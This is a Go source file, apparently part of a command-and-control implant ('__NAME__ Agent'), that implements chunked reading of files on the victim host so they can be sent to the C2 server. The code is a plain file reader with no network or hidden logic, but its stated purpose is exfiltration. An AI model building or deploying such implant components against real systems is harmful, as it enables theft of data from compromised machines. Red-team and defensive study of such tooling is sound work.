// __NAME__ Agent — File Download Manager
//
// Manages chunked file downloads from the agent to the C2 server.
// Use Start() to begin a download, ReadChunk() to get the next chunk,
// Finish()/Cancel() to complete or abort.

package impl

import (
	"fmt"
	"io"
	"os"
	"sync"
)

// ── Download states ────────────────────────────────────────────────────────────

const (
	DlStateInit     = 0
	DlStateActive   = 1
	DlStateFinished = 2
	DlStateCanceled = 3
)

// DownloadState tracks a single in-progress file download.
type DownloadState struct {
	DownloadId uint32
	State      int
	FilePath   string
	ChunkSize  int
	TotalSize  int64
	BytesSent  int64
	file       *os.File
}

// Downloader manages active file downloads.
type Downloader struct {
	mu        sync.Mutex
	downloads []DownloadState
	nextId    uint32
}

// NewDownloader creates an empty downloader.
func NewDownloader() *Downloader {
	return &Downloader{nextId: 1}
}

// Start begins a new download for the given file path and returns its ID.
func (d *Downloader) Start(filePath string, chunkSize int) (uint32, error) {
	f, err := os.Open(filePath)
	if err != nil {
		return 0, err
	}
	info, err := f.Stat()
	if err != nil {
		f.Close()
		return 0, err
	}
	if chunkSize <= 0 {
		chunkSize = 100 * 1024 // 100 KB default
	}

	d.mu.Lock()
	defer d.mu.Unlock()
	id := d.nextId
	d.nextId++
	d.downloads = append(d.downloads, DownloadState{
		DownloadId: id,
		State:      DlStateActive,
		FilePath:   filePath,
		ChunkSize:  chunkSize,
		TotalSize:  info.Size(),
		BytesSent:  0,
		file:       f,
	})
	return id, nil
}

// ReadChunk returns the next chunk of data for the given download.
func (d *Downloader) ReadChunk(downloadId uint32) ([]byte, error) {
	d.mu.Lock()
	defer d.mu.Unlock()
	for i := range d.downloads {
		if d.downloads[i].DownloadId == downloadId {
			dl := &d.downloads[i]
			if dl.State != DlStateActive || dl.file == nil {
				return nil, fmt.Errorf("download %d not active", downloadId)
			}
			buf := make([]byte, dl.ChunkSize)
			n, err := dl.file.Read(buf)
			if n > 0 {
				dl.BytesSent += int64(n)
				if dl.BytesSent >= dl.TotalSize {
					dl.State = DlStateFinished
				}
				return buf[:n], nil
			}
			if err == io.EOF {
				dl.State = DlStateFinished
				return nil, io.EOF
			}
			return nil, err
		}
	}
	return nil, fmt.Errorf("download %d not found", downloadId)
}

// Finish marks a download as complete and closes the file handle.
func (d *Downloader) Finish(downloadId uint32) {
	d.mu.Lock()
	defer d.mu.Unlock()
	for i := range d.downloads {
		if d.downloads[i].DownloadId == downloadId {
			if d.downloads[i].file != nil {
				d.downloads[i].file.Close()
				d.downloads[i].file = nil
			}
			d.downloads[i].State = DlStateFinished
			return
		}
	}
}

// Cancel aborts a download and cleans up resources.
func (d *Downloader) Cancel(downloadId uint32) {
	d.mu.Lock()
	defer d.mu.Unlock()
	for i := range d.downloads {
		if d.downloads[i].DownloadId == downloadId {
			if d.downloads[i].file != nil {
				d.downloads[i].file.Close()
				d.downloads[i].file = nil
			}
			d.downloads[i].State = DlStateCanceled
			return
		}
	}
}

// Find returns a pointer to the download with the given ID, or nil.
func (d *Downloader) Find(downloadId uint32) *DownloadState {
	d.mu.Lock()
	defer d.mu.Unlock()
	for i := range d.downloads {
		if d.downloads[i].DownloadId == downloadId {
			return &d.downloads[i]
		}
	}
	return nil
}

// ActiveCount returns the number of in-progress downloads.
func (d *Downloader) ActiveCount() int {
	d.mu.Lock()
	defer d.mu.Unlock()
	count := 0
	for _, dl := range d.downloads {
		if dl.State == DlStateActive {
			count++
		}
	}
	return count
}
